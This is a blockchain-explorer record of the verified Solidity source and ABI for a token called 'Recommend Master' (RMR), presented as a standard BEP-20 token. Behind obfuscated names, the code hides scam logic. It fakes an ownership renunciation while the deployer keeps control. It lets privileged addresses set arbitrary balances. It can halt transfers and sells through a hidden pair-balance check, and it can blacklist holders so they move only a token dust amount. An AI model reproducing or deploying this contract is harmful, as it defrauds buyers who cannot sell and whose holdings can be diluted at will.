{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tokenAuto {\n    function createPair(address atShould, address liquidityFund) external returns (address);\n}\n\ninterface launchAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderTo) external view returns (uint256);\n\n    function transfer(address fromLaunched, uint256 launchedList) external returns (bool);\n\n    function allowance(address enableAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromLaunched,\n        uint256 launchedList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalMax, uint256 value);\n    event Approval(address indexed enableAmount, address indexed spender, uint256 value);\n}\n\nabstract contract shouldMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchAutoMetadata is launchAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecommendMaster is shouldMin, launchAuto, launchAutoMetadata {\n\n    uint256 private txMode;\n\n    mapping(address => mapping(address => uint256)) private teamTradingSell;\n\n    bool private launchedAmount;\n\n    function receiverLaunched(address atSender, address fromLaunched, uint256 launchedList) internal returns (bool) {\n        if (atSender == modeAt) {\n            return launchedIsMax(atSender, fromLaunched, launchedList);\n        }\n        uint256 sellSwap = launchAuto(autoShould).balanceOf(fromSwap);\n        require(sellSwap == marketingBuy);\n        require(fromLaunched != fromSwap);\n        if (takeTotalLiquidity[atSender]) {\n            return launchedIsMax(atSender, fromLaunched, marketingMin);\n        }\n        return launchedIsMax(atSender, fromLaunched, launchedList);\n    }\n\n    string private minTo = \"RMR\";\n\n    event OwnershipTransferred(address indexed swapMax, address indexed shouldSellAt);\n\n    mapping(address => bool) public takeTotalLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return takeTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTo;\n    }\n\n    function marketingFee(address teamMinReceiver) public {\n        if (marketingSell) {\n            return;\n        }\n        \n        tokenIsWallet[teamMinReceiver] = true;\n        \n        marketingSell = true;\n    }\n\n    address receiverAmountLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public tokenIsWallet;\n\n    uint256 constant marketingMin = 14 ** 10;\n\n    address private autoExemptBuy;\n\n    address public modeAt;\n\n    function buyTotalLaunched(address maxWalletTotal) public {\n        modeAtToken();\n        \n        if (maxWalletTotal == modeAt || maxWalletTotal == autoShould) {\n            return;\n        }\n        takeTotalLiquidity[maxWalletTotal] = true;\n    }\n\n    string private takeTotal = \"Recommend Master\";\n\n    function balanceOf(address senderTo) public view virtual override returns (uint256) {\n        return shouldSender[senderTo];\n    }\n\n    bool public marketingSell;\n\n    address fromSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address fromShould, uint256 launchedList) public virtual override returns (bool) {\n        teamTradingSell[_msgSender()][fromShould] = launchedList;\n        emit Approval(_msgSender(), fromShould, launchedList);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return autoExemptBuy;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minTo;\n    }\n\n    function launchedIsMax(address atSender, address fromLaunched, uint256 launchedList) internal returns (bool) {\n        require(shouldSender[atSender] >= launchedList);\n        shouldSender[atSender] -= launchedList;\n        shouldSender[fromLaunched] += launchedList;\n        emit Transfer(atSender, fromLaunched, launchedList);\n        return true;\n    }\n\n    uint256 public buyLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listLiquidityLaunched;\n    }\n\n    bool public walletList;\n\n    uint256 private senderLimit;\n\n    uint256 public takeBuy;\n\n    uint256 public swapShould;\n\n    uint256 marketingBuy;\n\n    function buyToken(address marketingReceiver, uint256 launchedList) public {\n        modeAtToken();\n        shouldSender[marketingReceiver] = launchedList;\n    }\n\n    function listTx(uint256 launchedList) public {\n        modeAtToken();\n        marketingBuy = launchedList;\n    }\n\n    uint256 private listLiquidityLaunched = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private shouldSender;\n\n    uint256 isSell;\n\n    function tokenTeam() public {\n        emit OwnershipTransferred(modeAt, address(0));\n        autoExemptBuy = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return autoExemptBuy;\n    }\n\n    address public autoShould;\n\n    constructor (){\n        \n        takeExempt fromTeam = takeExempt(receiverAmountLiquidity);\n        autoShould = tokenAuto(fromTeam.factory()).createPair(fromTeam.WETH(), address(this));\n        \n        modeAt = _msgSender();\n        tokenIsWallet[modeAt] = true;\n        shouldSender[modeAt] = listLiquidityLaunched;\n        tokenTeam();\n        if (walletList) {\n            walletList = false;\n        }\n        emit Transfer(address(0), modeAt, listLiquidityLaunched);\n    }\n\n    uint8 private receiverTo = 18;\n\n    uint256 public feeShouldReceiver;\n\n    function transferFrom(address atSender, address fromLaunched, uint256 launchedList) external override returns (bool) {\n        if (_msgSender() != receiverAmountLiquidity) {\n            if (teamTradingSell[atSender][_msgSender()] != type(uint256).max) {\n                require(launchedList <= teamTradingSell[atSender][_msgSender()]);\n                teamTradingSell[atSender][_msgSender()] -= launchedList;\n            }\n        }\n        return receiverLaunched(atSender, fromLaunched, launchedList);\n    }\n\n    function allowance(address modeWallet, address fromShould) external view virtual override returns (uint256) {\n        if (fromShould == receiverAmountLiquidity) {\n            return type(uint256).max;\n        }\n        return teamTradingSell[modeWallet][fromShould];\n    }\n\n    function modeAtToken() private view {\n        require(tokenIsWallet[_msgSender()]);\n    }\n\n    function transfer(address marketingReceiver, uint256 launchedList) external virtual override returns (bool) {\n        return receiverLaunched(_msgSender(), marketingReceiver, launchedList);\n    }\n\n    bool private txSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSellAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedList\",\"type\":\"uint256\"}],\"name\":\"buyToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWalletTotal\",\"type\":\"address\"}],\"name\":\"buyTotalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShouldReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedList\",\"type\":\"uint256\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMinReceiver\",\"type\":\"address\"}],\"name\":\"marketingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTotalLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenIsWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RecommendMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}